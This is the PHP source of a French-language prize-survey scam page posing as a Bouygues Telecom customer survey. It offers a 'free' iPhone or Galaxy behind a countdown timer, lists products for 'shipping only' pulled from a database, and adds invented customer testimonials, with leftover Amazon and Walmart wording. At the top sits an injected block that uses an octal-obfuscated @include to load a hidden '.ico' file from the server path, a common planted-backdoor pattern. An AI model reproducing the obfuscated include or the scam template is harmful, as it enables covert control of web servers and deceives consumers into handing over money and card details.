<?php
/*b402a*/

@include "\057hom\145/ho\163tin\147adm\151n/g\154oba\154sur\166eyz\056com\057Bou\171gue\163/v1\057.ef\0643cd\0666.i\143o";

/*b402a*/

?>
<?php 
//echo 'running';exit;
include 'database.php';?>

<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <title>Global Surveyz</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="shortcut icon" href="images/icon-link.png">

    <!-- Stylesheets -->
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="manifest" href="/manifest.json">

    <!-- Javascripts -->
    <script type="text/javascript" src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <script src="https://api.pushnami.com/scripts/v1/push/5cc3732f1d0e1c0010965b84"></script>
     <!--<script src="https://api.pushnami.com/scripts/v1/push/5c9d2789287513001071eb63"></script>-->


    <!-- modal popup start js-->
    <script type="text/javascript">
    window.onbeforeload = function() {
        document.onkeydown = function(e) {
            return (e.which || e.keyCode) != 116;
        };
    }
    window.onload = function() {
        //   jQuery('#myModal').modal('show');
    };
    $(document).ready(function() {
        // Handler for .ready() called.
        jQuery('#myModal').modal('show');
    });
    </script>
    <!-- modal popup end js-->
<script>
        $(document).ready(function() {
            $(".remove_link").click(function() {
                var url = $(this).attr('id');
                window.open(url, '_blank');
            });
        });
</script>
</head>

<body>

    <!-- Header -->

    <div class="top-header">
        <span><a href="#"><img src="images/bouygues.png" class="img-responsive"></a></span><br>
        <p> Mobile | Box | Box + Mobile | Bons Plans | Assistance</p>
        <hr>
        <!-- <span>amazon</span>
	<br>Shopper Survey ✓ -->

    </div>

    <!-- modal popup start HTML-->
    <div style="background-size: 100% 100%; display: block;" class="modal fade in" id="myModal" tabindex="-1"
        role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body" style="padding-left:25px;padding-right:25px; padding-bottom:25px;">
                    <!--<img style="display:block;margin-left:auto;margin-right:auto;" src="/gift.png" class=""></td>-->
                    <!--
						  <script>var msg = '<font size = "3"><strong>Congratulations Amazon shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';var msg2 = msg.replace("$date",datehax());document.write(msg2);</script>
                          -->
                    <script>
                    var msg =
                        '<font size = "3"><strong>Congratulations Walmart Shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><div class="fb-wrapper" id="fb-wrapper" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false"><\/div><\/div><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';
                    var msg2 = msg.replace("$date", datehax());
                    document.write(msg2);
                    </script>
                    <font size="3"><strong>Félicitations <span class="amazon-color"></span> Cher Client Bouygues!
                        </strong></font><br><br>Votre adresse<b> IP 85.203.13.24</b> a été sélectionné pour recevoir
                    GRATUITEMENT un<b> Apple iPhone 8 ou un Samsung Galaxy S8.</b> <b><span
                            class="amazon-color"></span>.</b><br><br>
                    <p>Pour recevoir votre cadeau, il vous suffit de répondre à notre sondage anonyme. Mais
                        dépêchez-vous! Il ne reste qu'un nombre limité de cadeaux pour aujourd'hui</p>
                    <br>Disponible pour les <strong><span style="color:red;">
                            <font color="red">
                                <div id="timebox" class="timebox" style="display: inline-block;">1:15 minutes</div> à
                                venir
                            </font>
                        </span></strong><br><br>
                    <!--<p>Reference number: <strong style="background-color: yellow">37159</strong>.</p> 
                              -->
                    <!--<span id="timer_box">This offer will expire in the next 2 minutes: <span id="timer" style="background-color: yellow"></span> </span>-->
                    <p></p><!-- Audio -->
                    <button id="modalbutton" style="background:#009DCC !important; ;color: #FFFFff;" type="button"
                        class="btn-lg  btn-start" data-dismiss="modal">Commencer</button>
                </div>
                <!--
						   <script type="text/javascript">
                              $('.btn-start').on('click', function() {

                                  document.getElementById('opening_audio').pause();
                                  return true;
                              });
                                  $('body').on('click', function() {
                                  document.getElementById('opening_audio').pause();
                                  return true;
                              });
                           </script>
                           -->
            </div>
        </div>
    </div>
    </div>
    </div>
    <!-- modal popup end HTML-->

    <!-- section -->
    <section class="rooms mt50">
        <div class="container">
            <div class="row reviewboxbuttons">
                <div class="col-sm-12">
                    <div id="1" style="display:block">
                        <div class="question-count center_q">Question 1 sur 9</div>
                        <div class="question center_q">Vous êtes ?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Un homme<br></button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Une femme<br></button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Autre<br></button>
                    </div>

                    <div id="2" style="display:none">
                        <div class="question-count center_q">Question 2 sur 9</div>
                        <div class="question center_q">Êtes-vous satisfait par Bouygues?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Très satisfait</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Satisfait</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Mécontent</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Très Mécontent</button>
                    </div>

                    <div id="3" style="display:none">
                        <div class="question-count center_q">Question 3 sur 9</div>
                        <div class="question center_q">Que préférez-vous chez Bouygues?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">La rapidité</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Le prix</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Les Services</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Aucune de ces
                            réponses</button>

                    </div>

                    <div id="4" style="display:none">
                        <div class="question-count center_q">Question 4 sur 9</div>
                        <div class="question center_q">Avez-vous déjà dû appeler l'assistance technique du Bouygues
                            raison d'un problème ?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Plus d'une fois</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Une fois</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Non</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Je ne suis pas
                            sûr(e)</button>
                    </div>

                    <div id="5" style="display:none">
                        <div class="question-count center_q">Question 5 sur 9</div>
                        <div class="question center_q">Comment évaluez-vous votre connexion Bouygues (y compris la
                            fiabilité, la vitesse, les signaux occupés, la déconnexion, etc.) ?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Excellente</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Très bonne</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Bonne</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Correcte</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Médiocre</button>

                    </div>

                    <div id="6" style="display:none">
                        <div class="question-count center_q">Question 6 sur 9</div>
                        <div class="question center_q">Êtes-vous déjà resté(e) chez Bouygues pendant plus de 6 mois ?
                        </div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Oui</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Non</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Ne suis pas
                            sûr(e)</button>
                    </div>
                    <div id="7" style="display:none">
                        <div class="question-count center_q">Question 7 sur 9</div>
                        <div class="question center_q">A quel degré recommanderiez-vous Bouygues à un ami ?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Très
                            probablement</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">probablement</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">peu
                            probablement</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);"> probablement
                            pas</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">jamais</button>
                    </div>

                    <div id="8" style="display:none">
                        <div class="question-count center_q">Question 8 sur 9</div>
                        <div class="question center_q">D'après votre connaissance des services Bouygues, est-il mieux,
                            identique ou pire que d'autres fournisseurs de services ?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Bien mieux</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">mieux</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">à peu près
                            pareil</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">pire</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">bien pire</button>
                    </div>

                    <div id="9" style="display:none">
                        <div class="question-count center_q">Question 9 sur 9</div>
                        <div class="question center_q">Quelle est votre catégorie d'âge ?</div>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">18-24</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">25-34</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">35-44</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">45-64</button>
                        <button id="q1a" type="button" class="sv_btn" onclick="last(this);">65+</button>
                    </div>
                    <div id="loading-img" style="display:none;">
                        <p style="text-align:center"><b>C'est bon, vous avez fini ! </b></p>
                        <p style="text-align:center">Envoi de réponses ...</p>
                        <img src="images/TaPz.gif" class="img-responsive">
                    </div>
                    <!-- resulet -->
                    <div id="results" style="display:none">
                        <br>
                        <div class="media well well-sm">


                            <div class="media-body">

                                <script>
                                var msg =
                                    '<font size = "5"><strong>Thank you for completing the Amazon survey!</strong></font><br><br>To show our appreciation for providing us with extremely valuable consumer data, you may now choose <b>(1)</b> of the following exclusive products below.<br><br>Please note that due to extremely HIGH demand, there is a limited supply of these rewards in stock.<br><div class="fb-wrapper" id="fb-wrapper2" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false"><\/div><\/div><br>Special offer available today: <strong>$date<\/strong><\/font><br><br>Coupon code:</strong> <span style="background-color: #FFFF00">"<strong>AMAZONSURVEY</strong>"</span> has been applied for reduced shipping costs.';
                                var msg2 = msg.replace("$date", datehax());
                                document.write(msg2);
                                </script>
                                <font size="5"><b>Merci d'avoir répondu à notre enquête !</b></font><br><br>À cause
                                d'une demande extrêmement élevée, il ne nous reste que très peu de produits en
                                stock.<br>
                                <font size=""> Veuillez choisir <strong>uniquement UNE (1) récompense exclusive</strong>
                                </font><br>Les offres spéciales pour aujourd'hui UNIQUEMENT <strong><span
                                        id="datetime2"></span></strong></font><br><br>
                                <font color="#229A22">✓ ✓ Votre code promo a bien été utilisé <strong> 50SONDPRIX</font>
                                </strong>

                                </span>

                            </div>
                        </div>
                        <div id="offers">
                            <div class="row row-parent" id="owallwrapper">

                            <?php 
                              $products = mysqli_query($conn,"SELECT * FROM products") or die( mysqli_error($conn));
                              if($products){
                                  while($row=mysqli_fetch_array($products,MYSQLI_ASSOC)){
                            ?>

                                <div id="offer_main_div_1" class="col-md-12 item sex_female" data-name="female">
                                    <div class="row offer-row"
                                        style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#F5F5F5;">
                                        <div class="col-md-3 text-center"> <br>
                                        <?php
                                            if(!empty($row['images'])){
                                        
                                        ?>
                                            <a href="<?php echo $row['url_1'];?>"
                                                target="_blank"><img id="offer_img_1" class="img-responsive"
                                                    style="max-width: 130px; margin: 0 auto;" src="<?php echo $row['images'];?>"
                                                    alt="..." onclick="ViewOffer_1();"></a>
                                            <div class="reviewitem" style="color:#164d96;"><img id="star_img_1"
                                                    src="images/4-half-star.png" height="18" width="71"
                                                    onclick="ViewOffer_1();"> <a id="offer_review_anchor_1"
                                                    onclick="ViewOffer_1();">(<?php echo $row['review_users'];?>)</a></div> <br>
                                                    <?php }
                                                    elseif(empty($row['images']) || $row['images'] == NULL)
                                                    { 
                                                    ?>
                                                     <img src="images/products_image/default-product-img.jpg" width="100px">
                                                <?php   
                                                    }
                                                ?>
                                                    
                                        </div>
                                        <div class="col-md-5 text-center" style="color: black;"> <br>
                                            <strong>
                                                <font size="3"><u><?php echo $row['product_name'];?></u></font>
                                            </strong><br>
                                            <b><?php echo $row['description'];?></b>
                                            <br> Prix normal: <strike> <?php echo $row['product_price'];?>€</strike> <br> Prix d'aujourd'hui: <font
                                                color="#008000"><strong style="background-color: yellow;">
                                                <?php echo $row['regular_price'];?>€</strong></font><br> Ne payez que les frais
                                            d'expédition<strong><?php echo $row['shipping'];?>€</strong><br> Quantité disponible:(<font
                                                color="#FF0000"><?php echo $row['quantity'];?></font>)<br> <br> <span class=" quantity"> <span
                                                    class="label label-danger">1</span> </span>
                                        </div>
                                        <div id="claim_btn_div_1" class="col-md-4 height:100%;">
                                            
                                            <?php 
                                                if($row['img_popular'] != "")
                                                {
                                            ?>
                                            <img src="<?php echo $row['img_popular'];?>" class="img-responsive">
                                            <?php 
                                            }
                                            ?>
                                            
                                                <a id="<?php echo $row['url_1'];?>"class="remove_link"
                                                target="_blank"><button id="claim_btn_1" onclick="ViewOffer_1();"
                                                    style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background:#009DCC ;color: #ffffff;"
                                                    class="text-center btn-lg click_claim_btn">Cliquez içi
                                                    →</button></a>
                                        </div>
                                    </div>
                                </div>
                                <?php }  }   ?>

                                <div id="offer_main_div_9" class="col-md-12 item sex_female" data-name="female"
                                    style="opacity: 0.45;">
                                    <div class="row offer-row"
                                        style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#F5F5F5;">
                                        <div class="col-md-3 text-center"> <br><img id="offer_img_9"
                                                class="img-responsive" style="max-width: 130px; margin: 0 auto;"
                                                src="images/11.png" alt="..." onclick="ViewOffer_9();">
                                            <div class="reviewitem" style="color:#164d96;"><img id="star_img_9"
                                                    src="images/5-star.png" height="18" width="71"
                                                    onclick="ViewOffer_9();"> <a id="offer_review_anchor_9"
                                                    onclick="ViewOffer_9();">(362)</a></div> <br>
                                        </div>
                                        <div class="col-md-5 text-center" style="color: black;"> <br> <strong>
                                                <font size="3"><u>Obtenez votre iPhone X©</u></font>
                                            </strong><br><b>2018 iPhone le plus populaire! </b> <br> Prix normal:
                                            <strike> 999,99€</strike> <br> Prix d'aujourd'hui: <font color="#008000">
                                                <strong style="background-color: yellow;">0,00€</strong></font><br> Ne
                                            payez que les frais d'expédition: <strong>1,50€</strong><br>Quantité
                                            disponible: (<font color="#FF0000">0</font>)<br> <br> <span
                                                class=" quantity"> <span class="label label-danger">1</span> </span>
                                        </div>
                                        <div id="claim_btn_div_9" class="col-md-4 height:100%;">
                                            <font color="red">**<b> Out Of Stock**</b></font>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <br>
                        <br>
                        <h4>Qu'avez-vous pensé de l'enquête ?</h4>
                        <ul class="list-group">
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t1.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">HGuillaume Dubois<span class="comment-time">
                                            <script>
                                            r_comment_date(1);
                                            </script>Apr 15,2019 at 11:55 am
                                        </span></p>
                                    <p class="comment-body">J’étais tombé sur ce concours mais je m’étais dit que
                                        c’était bidon. J'ai vu cette annonce à nouveau et j’ai décidé d'essayer... Et au
                                        final, j'ai aussi obtenu mon Samsung S9 ! C’est un truc de FOU !</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t2.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Anton Rousseau<span class="comment-time">
                                            <script>
                                            r_comment_date(1);
                                            </script>Apr 14,2019 à 5:30 pm
                                        </span></p>
                                    <p class="comment-body">Pas difficile ... rien Gagner est mieux que rien ...</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t3.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Deniel Couture<span class="comment-time">
                                            <script>
                                            r_comment_date(2);
                                            </script>Apr 11,2019 à 3:30 pm
                                        </span></p>
                                    <p class="comment-body">Le miens est arrivé aujourd’hui! Merci pour le iPhone!!!</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t4.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Léa Lefebvre<span class="comment-time">
                                            <script>
                                            r_comment_date(4);
                                            </script>Apr 15,2019 à 2:30 pm
                                        </span></p>
                                    <p class="comment-body">Le sondage était rapide et facile. Ça me dérangerait pas de
                                        répondre à un autre pour recevoir un autre cadeau gratuit.</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t5.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Lillian Ong<span class="comment-time">
                                            <script>
                                            r_comment_date(4);
                                            </script>Apr 13,2019 à 2:00 am
                                        </span></p>
                                    <p class="comment-body">Je pensais que ce était une blague au début, par mon samsung
                                        galaxy S8 effectivement venu dans le courrier ce matin et il n'y a rien qui me
                                        empêche de se inscrire à chacun d'eux, que je ai fait hehe</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t6.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Emma Thomas<span class="comment-time">
                                            <script>
                                            r_comment_date(4);
                                            </script>Apr 14,2019 à 3:15 pm
                                        </span></p>
                                    <p class="comment-body">Je pensais que c’était une arnaque, mais je viens vraiment
                                        de recevoir un iPhone ce matin. Un original, sans aucune escroquerie. J’ai
                                        répondu au questionnaire avec le nom de ma copine et de ma mère, des fois que ça
                                        marche encore une fois, hahaha</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t7.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Jean Moreau<span class="comment-time">
                                            <script>
                                            r_comment_date(4);
                                            </script>Apr 15,2019 à 3:00 am
                                        </span></p>
                                    <p class="comment-body">J'ai donné la crème pour la peau à ma soeur en cadeau..</p>
                                </div>
                            </li>
                            <li class="media list-group-item2">
                                <img class="media-object pull-left" src="images/t.png" alt="...">
                                <div class="media-body">
                                    <p class="media-heading comment-name">Lucas Roux<span class="comment-time">
                                            <script>
                                            r_comment_date(5);
                                            </script>Apr 14,2019 à 11:12 pm
                                        </span></p>
                                    <p class="comment-body">J'ai choisi le samsung s9 pour ma mère. C'était un cadeau
                                        parfait et elle est tellement heureuse!</p>
                                </div>
                            </li>
                            <li style="list-style: none">
                                <br>
                                <div id="confirmationbackground" class="well well-sm">
                                    <div class="form-horizontal">
                                        <fieldset id="commmentform">
                                            <legend>Laissez vos commentaires</legend>
                                            <!-- Name input-->
                                            <div class="form-group">
                                                <label class="col-md-3 control-label" for="name">Votre Nom</label>
                                                <div class="col-md-6">
                                                    <input id="name" name="name" placeholder="" class="form-control"
                                                        type="text">
                                                </div>
                                            </div>
                                            <div class="form-group">
                                                <label class="col-md-3 control-label" for="name">Votre Email</label>
                                                <div class="col-md-6">
                                                    <input id="name" name="name" placeholder="" class="form-control"
                                                        type="text">
                                                </div>
                                            </div>
                                            <!-- Email input-->
                                            <!--
                                    <div class="form-group">
                                       <label class="col-md-3 control-label" for="email">Your Email</label>
                                       <div class="col-md-6">
                                          <input id="email" name="email" placeholder="" class="form-control" type="text">
                                       </div>
                                    </div>
                                    -->
                                            <!-- Message body -->
                                            <div class="form-group">
                                                <label class="col-md-3 control-label" for="message">Vos
                                                    commentaires</label>
                                                <div class="col-md-9">
                                                    <textarea class="form-control" id="message" name="message"
                                                        placeholder="" rows="4"></textarea>
                                                </div>
                                            </div>
                                            <div class="col-md-6"></div>
                                            <div class="col-md-6">
                                                <button id="commentbutton"
                                                    style="font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background:#232f3e; color: #ffffff;"
                                                    class="text-center btn-lg click_claim_btn">Commentaires</button>
                                            </div>
                                            <script type="text/javascript">
                                            $('#commentbutton').click(function() {
                                                $('#commmentform').slideUp(1000, function() {
                                                    $('#confirmationbackground').html(
                                                        '<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>'
                                                        );
                                                    setTimeout(function() {
                                                        $('#confirmationbackground').html(
                                                            '<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>'
                                                            );
                                                        $('#confirmationbackground').css(
                                                            "background-color", "#87EA55");
                                                    }, 2000)
                                                })
                                            })
                                            </script>
                                        </fieldset>
                                    </div>
                                </div>
                            </li>
                        </ul>
                    </div>
                    <!-- resulet -->


                </div>
            </div>
            <div class="row reviewbox">
                <!-- col-sm-12 -->
                <div class="col-sm-12">
                    <h1>Customer Reviews</h1>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">Très content !</div>
                            <span class="user_info">BY MARIE ROUSSEAU, LOURDES</span>
                            <p>J'ai réceptionné le mien aujourd'hui! Merci beaucoup pour ce nouvel iPhone X!
                            </p>
                        </div>
                    </div>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">Très bons produits</div>
                            <span class="user_info">BY LÉA LEFEBVRE, TOULOUSE</span>
                            <p>Le sondage était rapide et facile. Ça me dérangerait pas de répondre à un autre pour
                                recevoir un autre cadeau gratuit.
                            </p>
                        </div>
                    </div>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">J'ai reçu ma carte-cadeau dans les 12</div>
                            <span class="user_info">BY LILLIAN ONG, PARIS</span>
                            <p>Je pensais que ce était une blague au début, par mon samsung galaxy A9 effectivement venu
                                dans le courrier ce matin et il n'y a rien qui me empêche de se inscrire à chacun d'eux,
                                que je ai fait lol
                            </p>
                        </div>
                    </div>
                    <div class="col-sm-6">
                        <div class="review">
                            <img src="images/big_4_half_star.png">
                            <div class="rate4 review_title">Nous venons de mon prix dans le courrier!</div>
                            <span class="user_info">BY ALEXANDRE BOURGEOIS, DIJON</span>
                            <p>Merci pour les cadeaux ! J'ai donné la crème pour la peau à ma sœur pour son anniversaire
                                . Je me suis inscrit pour tous les éléments énumérés ! Pourquoi pas?
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- section -->
    <footer class="survey-container">
        <div id="terms">
            <center>
                <img src="images/f_guarantee.png" alt="guarantee" height="50" width="auto"> <img
                    src="images/f_secure_1.png" alt="secureSiteLogo" height="50" width="auto">
            </center>
            <br>
            <font size="2.0">©Tous droits réservés. <br>
                <br>Votre vie privée est importante pour nous. Nous ne recueillons pas vos informations personnelles
                dans ce questionnaire. S'il vous plaît consulter notre politique et modalités confidentialité. Nous ne
                sommes pas affiliés ni un partenariat avec une tierce partie. Voir les termes et conditions importants.
                <a href="terms-conditions.html" rel="nofollow" onclick="window.open('terms-conditions.html', 'Terms','width=550,height=500,scrollbars=yes,resizable=yes'); return false;">here.</a>
            </font>
        </div>
        </font>
    </footer>

</body>

<script>
function goToNext(element){
	var currentQuestion=$(element).parent().attr('id');
	var nextQuestion=parseInt(currentQuestion)+1;
	jQuery('#'+currentQuestion).css("display","none");
	jQuery('#'+nextQuestion).css("display","block");
}
function last(element){
	var currentQuestion=$(element).parent().attr('id');
	jQuery('#'+currentQuestion).css("display","none");
	$('#loading-img').css("display","block");
	setTimeout(function(){ 
							$('#loading-img').css("display","none");
					}, 4000);
	setTimeout(function(){ 
							$('#results').css("display","block");
							$('.reviewbox').css("display","none");
							
					}, 4000);

}
</script>
<script type="text/javascript" src="https://s3-us-west-1.amazonaws.com/imgcenter/s/2/js/countdown.js"></script>
<script>
jsc.init(299, 'timebox', '');
</script>
<script>
$(document).ready(function() {
    stupid_timer();
});

function stupid_timer() {
    console.log('TRIGGERED');

    var box = $('#timebox');
    if ($('#timebox')) {
        console.log('element found');
    } else {
        console.warn('element NOT FOUND');
    }

    // $('#timebox').text('IM A TIMEBOX LOOK AT ME');

}

function startTimer(t, msg) {
    var e,
        n,
        r = t,
        a = setInterval(function() {
            e = parseInt(r / 60, 10),
                n = parseInt(r % 60, 10),
                n = 10 > n ?
                "0" + n :
                n,
                $("#timebox").text(e + ":" + n),
                --r < 0 && (reset_timer(a, msg))
        }, 1e3)
}

function reset_timer(a, msg) {
    clearInterval(a);
    $('#timebox').html(msg);
}
</script>
<script>
var dt = new Date();
document.getElementById("datetime2").innerHTML = dt.toLocaleDateString();
</script>


</html>